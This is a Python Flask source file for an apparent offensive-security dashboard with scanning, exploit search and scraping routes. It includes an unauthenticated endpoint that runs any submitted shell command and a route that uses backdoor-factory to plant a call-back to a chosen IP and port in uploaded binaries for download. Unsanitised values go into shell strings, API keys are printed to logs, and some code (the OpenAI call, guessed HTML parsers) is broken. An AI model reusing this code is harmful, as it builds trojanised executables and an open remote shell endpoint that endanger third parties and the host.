from flask import Flask, request, render_template, jsonify
import subprocess
import os
import requests
from bs4 import BeautifulSoup
from datetime import datetime
import openai

app = Flask(__name__)

SCAN_SCRIPT_PATH = os.path.join(os.path.dirname(__file__), 'scan.py')
PAYLOAD_DIR = 'payloads'
os.makedirs(PAYLOAD_DIR, exist_ok=True)

def get_additional_info():
    return {
        'working_directory': os.getcwd(),
        'current_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'user': os.getlogin(),
        'user_id': os.getuid()
    }

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/perform_scan', methods=['POST'])
def perform_scan():
    target = request.form.get('target')
    scan_type = request.form.get('scan_type')
    stealth_scan = 'stealth_scan' in request.form
    verbose = 'verbose' in request.form

    if scan_type == 'aggressive_scan' and stealth_scan:
        return render_template('index.html', scan_output="Stealth scan cannot be used with aggressive scan.")
    
    args = [SCAN_SCRIPT_PATH, target, scan_type]
    if verbose:
        args.append('-vvv')

    try:
        result = subprocess.check_output(['python3'] + args, text=True, stderr=subprocess.STDOUT)
        scan_output = result
    except subprocess.CalledProcessError as e:
        scan_output = f"Error during scan: {e.output}"
    except Exception as e:
        scan_output = f"Unexpected error: {e}"

    return render_template('index.html', scan_output=scan_output)

@app.route('/execute_command', methods=['POST'])
def execute_command():
    command = request.form.get('command')

    try:
        result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        result = e.output
    except Exception as e:
        result = f"Unexpected error: {e}"

    return render_template('index.html', command_output=result)


VULNERS_API_URL = "https://vulners.com/api/v3/search/lucene/"

@app.route('/search_exploits', methods=['POST', 'GET'])
def search_exploits():
    search_term = request.form.get('search_term')
    api_key = request.form.get('api_key')

    print(f"Search term: {search_term}, API Key: {api_key}")  # Debugging output

    headers = {'Authorization': f'Token {api_key}'}
    results = []
    message = ""

    try:
        response = requests.get(VULNERS_API_URL, params={'query': search_term}, headers=headers)
        response.raise_for_status()

        data = response.json()

        if 'data' in data and 'search' in data['data']:
            items = data['data']['search']
            if not items:
                message = "No results found."
            else:
                results = [{'title': item.get('_id', 'No Title'),
                            'description': item.get('_source', {}).get('description', 'No Description'),
                            'link': f"https://vulners.com/{item.get('_id', '#')}"} for item in items]
        else:
            message = "Unexpected response format."
            print(f"Unexpected format: {data}")  # Debugging output

    except requests.RequestException as e:
        message = f"Error during search: {e}"
        print(f"Error: {e}")  # Debugging output

    return render_template('exploit_database.html', results=results, message=message)


@app.route('/factory_backdoor', methods=['GET', 'POST'])
def factory_backdoor():
    additional_info = get_additional_info()

    if request.method == 'POST':
        ip = request.form.get('ip')
        port = request.form.get('port')
        binary = request.files.get('binary')

        if binary:
            binary_path = os.path.join(PAYLOAD_DIR, binary.filename)
            binary.save(binary_path)

            backdoor_factory_command = f"backdoor-factory -i {binary_path} -o {binary_path}.backdoored -a {ip}:{port}"

            try:
                result = subprocess.check_output(backdoor_factory_command, shell=True, text=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                result = e.output
            except Exception as e:
                result = f"Unexpected error: {e}"

            backdoored_filename = f"{binary.filename}.backdoored"
            download_link = f"/download/{backdoored_filename}"

            return render_template('factory.html', command_output=result, download_link=download_link, **additional_info)
        else:
            return render_template('factory.html', command_output="No binary file uploaded.", **additional_info)

    return render_template('factory.html', **additional_info)

@app.route('/ai_assistance')
def ai_assistance():
    return render_template('ai_assistance.html')

@app.route('/ask', methods=['POST'])
def ask():
    data = request.json
    user_query = data.get('query')
    api_key = data.get('api_key')

    if not user_query:
        return jsonify({"error": "No query provided"}), 400

    if not api_key:
        return jsonify({"error": "No API key provided"}), 400

    response_text = get_response(user_query, api_key)
    return jsonify({"response": response_text})

def get_response(prompt, api_key):
    try:
        openai.api_key = api_key
        response = openai.Completion.create(
            engine="gpt-3.5-turbo",
            prompt=prompt,
            max_tokens=150
        )
        return response.choices[0].text.strip()
    except Exception as e:
        return f"Error: {str(e)}"

@app.route('/scrape_exploits', methods=['GET'])
def scrape_exploits():
    URLS = [
        {"url": "https://www.exploit-db.com/", "parse_func": parse_exploit_db},
        {"url": "https://www.cvedetails.com/", "parse_func": parse_cve_details},
        {"url": "https://nvd.nist.gov/", "parse_func": parse_nvd},
        {"url": "https://www.rapid7.com/db/modules/", "parse_func": parse_rapid7},
        {"url": "https://packetstormsecurity.com/", "parse_func": parse_packetstorm},
        {"url": "https://www.securityfocus.com/", "parse_func": parse_securityfocus},
        {"url": "https://www.0day.today/", "parse_func": parse_0day},
        {"url": "https://www.threatpost.com/", "parse_func": parse_threatpost}
    ]

    all_exploits = []

    for entry in URLS:
        url = entry["url"]
        base_url = url if url.startswith('http') else f"https://{url}"
        parse_func = entry["parse_func"]

        page_content = fetch_page(url)
        if page_content:
            exploits = parse_func(page_content, base_url)
            all_exploits.extend(exploits)

    return render_template('exploits_and_scanners.html', exploits=all_exploits)


def fetch_page(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        print(f"Error fetching {url}: {e}")
        return None

# Parsing Functions
def parse_exploit_db(page_content, base_url):
    soup = BeautifulSoup(page_content, 'html.parser')
    exploits = []

    for item in soup.find_all('div', class_='exploit'):
        title = item.find('a').text.strip()
        link = base_url + item.find('a')['href']
        description = item.find('div', class_='description').text.strip()
        date = item.find('span', class_='date').text.strip() if item.find('span', 'date') else 'No Date'

        exploits.append({
            'title': title,
            'description': description,
            'date': date,
            'link': link
        })

    return exploits

def parse_cve_details(page_content, base_url):
    soup = BeautifulSoup(page_content, 'html.parser')
    exploits = []

    for item in soup.find_all('tr', class_='srrowns'):
        title = item.find('a').text.strip()
        link = base_url + item.find('a')['href']
        description = item.find_all('td')[2].text.strip()
        date = item.find_all('td')[1].text.strip() if len(item.find_all('td')) > 1 else 'No Date'

        exploits.append({
            'title': title,
            'description': description,
            'date': date,
            'link': link
        })

    return exploits

def parse_nvd(page_content, base_url):
    soup = BeautifulSoup(page_content, 'html.parser')
    exploits = []

    for item in soup.find_all('div', class_='col-sm-12 col-lg-9'):
        title = item.find('a').text.strip()
        link = base_url + item.find('a')['href']
        description = item.find('p').text.strip()
        date = item.find('span', class_='pull-right').text.strip()

        exploits.append({
            'title': title,
            'description': description,
            'date': date,
            'link': link
        })

    return exploits

def parse_rapid7(page_content, base_url):
    soup = BeautifulSoup(page_content, 'html.parser')
    exploits = []

    for item in soup.find_all('div', class_='module-listing__item'):
        title = item.find('a').text.strip()
        link = base_url + item.find('a')['href']
        description = item.find('p').text.strip() if item.find('p') else 'No Description'
        date = item.find('time').text.strip() if item.find('time') else 'No Date'

        exploits.append({
            'title': title,
            'description': description,
            'date': date,
            'link': link
        })

    return exploits

def parse_packetstorm(page_content, base_url):
    soup = BeautifulSoup(page_content, 'html.parser')
    exploits = []

    for item in soup.find_all('dl'):
        title = item.find('dt').text.strip()
        link = base_url + item.find('a')['href']
        description = item.find('dd').text.strip()
        date = item.find('span', class_='datetime').text.strip() if item.find('span', class_='datetime') else 'No Date'

        exploits.append({
            'title': title,
            'description': description,
            'date': date,
            'link': link
        })

    return exploits

def parse_securityfocus(page_content, base_url):
    soup = BeautifulSoup(page_content, 'html.parser')
    exploits = []

    for item in soup.find_all('tr', class_='bgcolor'):
        title = item.find('a').text.strip()
        link = base_url + item.find('a')['href']
        description = item.find_all('td')[2].text.strip() if len(item.find_all('td')) > 2 else 'No Description'
        date = item.find_all('td')[1].text.strip() if len(item.find_all('td')) > 1 else 'No Date'

        exploits.append({
            'title': title,
            'description': description,
            'date': date,
            'link': link
        })

    return exploits
def parse_0day(page_content, base_url):
    soup = BeautifulSoup(page_content, 'html.parser')
    exploits = []

    # Assuming each exploit is in a div with a class like 'exploit' (you should adjust this based on actual HTML structure)
    for item in soup.find_all('div', class_='exploit-title'):
        title = item.find('a').text.strip()
        link = base_url + item.find('a')['href']
        description = item.find_next_sibling('div', class_='exploit-description').text.strip()
        date = item.find_next_sibling('div', class_='exploit-date').text.strip()

        exploits.append({
            'title': title,
            'description': description,
            'date': date,
            'link': link
        })

    return exploits
def parse_threatpost(page_content, base_url):
    soup = BeautifulSoup(page_content, 'html.parser')
    exploits = []

    # Assuming the articles are listed within divs with class 'article-details' (adjust based on HTML structure)
    for item in soup.find_all('div', class_='article-details'):
        title = item.find('a').text.strip()
        link = item.find('a')['href']
        description = item.find('div', class_='summary').text.strip() if item.find('div', class_='summary') else "No description available."
        date = item.find('time')['datetime'] if item.find('time') else "Unknown date"

        exploits.append({
            'title': title,
            'description': description,
            'date': date,
            'link': link
        })

    return exploits

# Add similar parsing functions for other sources like rapid7, packetstorm, etc.

if __name__ == '__main__':
    app.run(debug=True)
